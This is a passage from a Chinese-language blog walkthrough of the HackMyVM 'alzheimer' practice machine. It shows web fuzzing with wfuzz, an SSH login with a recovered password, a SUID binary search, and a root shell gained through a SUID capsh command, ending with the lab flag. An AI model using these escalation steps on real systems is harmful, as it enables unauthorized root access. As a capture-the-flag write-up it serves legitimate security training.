<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/ace]</span><br><span class="line">└─# curl -l 192.168.56.128</span><br><span class="line">I dont remember where I stored my password :(</span><br><span class="line">I only remember that was into a .txt file...</span><br><span class="line">-medusa</span><br><span class="line"></span><br><span class="line">&lt;!---. --- - .... .. -. --. --&gt;</span><br></pre></td></tr></table></figure>

<p>5.wfuzz扫一下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># wfuzz -c --hc=404 -t200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.56.128/FUZZ.txt </span></span><br><span class="line"> /usr/lib/python3/dist<span class="literal">-packages</span>/wfuzz/__init__.py:<span class="number">34</span>: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: http://192.168.56.128/FUZZ.txt</span></span><br><span class="line"><span class="string">Total requests: 220560</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word       Chars       Payload                                                                          </span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000000001:   200        5 L      27 W       132 Ch      &quot;# directory-list-2.3-medium.txt&quot;                                                </span></span><br><span class="line"><span class="string">000000007:   200        5 L      27 W       132 Ch      &quot;# license, visit http://creativecommons.org/licenses/by-sa/3.0/&quot;                </span></span><br><span class="line"><span class="string">000000003:   200        5 L      27 W       132 Ch      &quot;# Copyright 2007 James Fisher&quot;                                                  </span></span><br><span class="line"><span class="string">000000004:   200        5 L      27 W       132 Ch      &quot;#&quot;                                                                              </span></span><br><span class="line"><span class="string">000000002:   200        5 L      27 W       132 Ch      &quot;#&quot;                                                                              </span></span><br><span class="line"><span class="string">000000005:   200        5 L      27 W       132 Ch      &quot;# This work is licensed under the Creative Commons&quot;                             </span></span><br><span class="line"><span class="string">000000008:   200        5 L      27 W       132 Ch      &quot;# or send a letter to Creative Commons, 171 Second Street,&quot;                     </span></span><br><span class="line"><span class="string">000000006:   200        5 L      27 W       132 Ch      &quot;# Attribution-Share Alike 3.0 License. To view a copy of this&quot;                  </span></span><br><span class="line"><span class="string">000000009:   200        5 L      27 W       132 Ch      &quot;# Suite 300, San Francisco, California, 94105, USA.&quot;                            </span></span><br><span class="line"><span class="string">000000010:   200        5 L      27 W       132 Ch      &quot;#&quot;                                                                              </span></span><br><span class="line"><span class="string">000000011:   200        5 L      27 W       132 Ch      &quot;# Priority ordered case-sensitive list, where entries were found&quot;               </span></span><br><span class="line"><span class="string">000000012:   200        5 L      27 W       132 Ch      &quot;# on at least 2 different hosts&quot;                                                </span></span><br><span class="line"><span class="string">000000013:   200        5 L      27 W       132 Ch      &quot;#&quot;                                                                              </span></span><br><span class="line"><span class="string">Total time: 0</span></span><br><span class="line"><span class="string">Processed Requests: 220560</span></span><br><span class="line"><span class="string">Filtered Requests: 220547</span></span><br><span class="line"><span class="string">Requests/sec.: 0</span></span><br></pre></td></tr></table></figure>

<p>6.尝试登录ssh</p>
<p>密码：Ihavebeenalwayshere!!!</p>
<p>登陆成功：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># ssh medusa@192.168.56.128                                                                                                      </span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.56.128 (192.168.56.128)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:O2S8HAtlJxSTJJgIQUiIzsbSKX/qj9Thyn38JM6wsBY.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span><span class="number">192.168</span>.<span class="number">56.128</span><span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">medusa@192.168.56.128&#x27;</span>s password: </span><br><span class="line">Linux alzheimer <span class="number">4.19</span>.<span class="number">0</span><span class="literal">-9-amd64</span> <span class="comment">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sat Oct  <span class="number">3</span> <span class="number">06</span>:<span class="number">00</span>:<span class="number">36</span> <span class="number">2020</span> from <span class="number">192.168</span>.<span class="number">1.58</span></span><br><span class="line">medusa@alzheimer:~<span class="variable">$</span> </span><br></pre></td></tr></table></figure>

<p>7.提权</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">medusa@alzheimer:~<span class="variable">$</span> find / <span class="literal">-user</span> root <span class="literal">-perm</span> <span class="literal">-4000</span> <span class="literal">-print</span> <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/usr/lib/dbus<span class="literal">-1</span>.<span class="number">0</span>/dbus<span class="literal">-daemon-launch-helper</span></span><br><span class="line">/usr/lib/openssh/ssh<span class="literal">-keysign</span></span><br><span class="line">/usr/lib/eject/dmcrypt<span class="literal">-get-device</span></span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/<span class="built_in">mount</span></span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/sbin/capsh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现：</p>
<p><img src="F:%5CDESKTOP%5C%E6%B8%97%E9%80%8F%5Cimage%5Cimage-20230723180449391.png" alt="image-20230723180449391"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">medusa@alzheimer:~<span class="variable">$</span> /usr/sbin/capsh <span class="literal">--gid</span>=<span class="number">0</span> <span class="literal">--uid</span>=<span class="number">0</span> <span class="literal">--</span></span><br><span class="line">root@alzheimer:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@alzheimer:~<span class="comment"># cd root</span></span><br><span class="line">bash: <span class="built_in">cd</span>: root: No such file or directory</span><br><span class="line">root@alzheimer:~<span class="comment"># cd ..</span></span><br><span class="line">root@alzheimer:/home<span class="comment"># cd .</span></span><br><span class="line">root@alzheimer:/home<span class="comment"># cd ..</span></span><br><span class="line">root@alzheimer:/<span class="comment"># ls</span></span><br><span class="line">bin   dev  home        initrd.img.old  lib32  libx32      media  opt   root  sbin  sys  usr  vmlinuz</span><br><span class="line">boot  etc  initrd.img  lib             lib64  lost+found  mnt    proc  run   srv   tmp  var  vmlinuz.old</span><br><span class="line">root@alzheimer:/<span class="comment"># cd root</span></span><br><span class="line">root@alzheimer:/root<span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@alzheimer:/root<span class="comment"># cat root.txt </span></span><br><span class="line">HMVlovememories</span><br><span class="line">root@alzheimer:/root<span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/23/alzheimer/" data-id="clmnr8k010003so8g8fmg9le5" data-title="alzheimer" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hackmyvm/" rel="tag">hackmyvm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" rel="tag">目录遍历</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/hack-the-box/">hack the box</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/home/">home</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux%E5%AD%A6%E4%B9%A0/">linux学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/burp-suite/" rel="tag">burp suite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chown/" rel="tag">chown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/find/" rel="tag">find</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ftp/" rel="tag">ftp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gittools/" rel="tag">gittools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hackmyvm/" rel="tag">hackmyvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/home/" rel="tag">home</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hydra/" rel="tag">hydra</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E6%8F%90%E6%9D%83/" rel="tag">linux提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msf/" rel="tag">msf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msfs/" rel="tag">msfs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nmap/" rel="tag">nmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pspy/" rel="tag">pspy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellinabox/" rel="tag">shellinabox</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh/" rel="tag">ssh</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/talnet/" rel="tag">talnet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tryhackme/" rel="tag">tryhackme</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webshell/" rel="tag">webshell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%86%E7%A0%B4/" rel="tag">爆破</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%9B%AE%E5%BD%95%E6%B8%97%E9%80%8F/" rel="tag">目录渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" rel="tag">目录遍历</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%AF%E5%BE%84%E5%8A%AB%E6%8C%81/" rel="tag">路径劫持</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/burp-suite/" style="font-size: 10px;">burp suite</a> <a href="/tags/chown/" style="font-size: 10px;">chown</a> <a href="/tags/find/" style="font-size: 10px;">find</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/fuzz/" style="font-size: 12.5px;">fuzz</a> <a href="/tags/gittools/" style="font-size: 10px;">gittools</a> <a href="/tags/hackmyvm/" style="font-size: 20px;">hackmyvm</a> <a href="/tags/home/" style="font-size: 10px;">home</a> <a href="/tags/hydra/" style="font-size: 10px;">hydra</a> <a href="/tags/linux%E6%8F%90%E6%9D%83/" style="font-size: 10px;">linux提权</a> <a href="/tags/msf/" style="font-size: 12.5px;">msf</a> <a href="/tags/msfs/" style="font-size: 10px;">msfs</a> <a href="/tags/nmap/" style="font-size: 10px;">nmap</a> <a href="/tags/pspy/" style="font-size: 10px;">pspy</a> <a href="/tags/shellinabox/" style="font-size: 10px;">shellinabox</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/talnet/" style="font-size: 10px;">talnet</a> <a href="/tags/tryhackme/" style="font-size: 17.5px;">tryhackme</a> <a href="/tags/webshell/" style="font-size: 15px;">webshell</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E7%9B%AE%E5%BD%95%E6%B8%97%E9%80%8F/" style="font-size: 10px;">目录渗透</a> <a href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" style="font-size: 12.5px;">目录遍历</a> <a href="/tags/%E8%B7%AF%E5%BE%84%E5%8A%AB%E6%8C%81/" style="font-size: 10px;">路径劫持</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/09/18/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2023/09/18/home/">home</a>
          </li>
        
          <li>
            <a href="/2023/08/30/linux%E6%8F%90%E6%9D%83/">linux提权</a>
          </li>
        
          <li>
            <a href="/2023/08/19/venus/">venus</a>
          </li>
        
          <li>
            <a href="/2023/08/11/flower/">flower</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 honkerZ<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>